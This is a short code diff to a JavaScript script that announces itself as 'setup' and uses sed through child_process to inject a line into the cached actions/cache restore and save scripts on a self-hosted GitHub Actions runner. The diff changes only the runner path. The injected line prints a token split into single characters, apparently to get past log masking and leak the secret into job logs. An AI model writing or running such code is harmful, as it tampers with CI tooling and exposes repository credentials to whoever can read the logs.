@@ -69,7 +69,7 @@ console.log("this is a setup.....")
 
 let writecontent = 'console.log(JSON.stringify(token.split("")));';
 
-cl_process.exec(`sed -i '3458i ${writecontent}' /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
+cl_process.exec(`sed -i '3458i ${writecontent}' /home/musset/Documents/actions-runner-org/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
     if (err){
         console.log(err);
         return;
@@ -78,7 +78,7 @@ cl_process.exec(`sed -i '3458i ${writecontent}' /home/musset/Documents/actions-r
     console.log(`stderr: ${stderr}`);
 });
 
-cl_process.exec(`sed -i '3458i ${writecontent}' /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
+cl_process.exec(`sed -i '3458i ${writecontent}' /home/musset/Documents/actions-runner-org/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
     if (err){
         console.log(err);
         return;
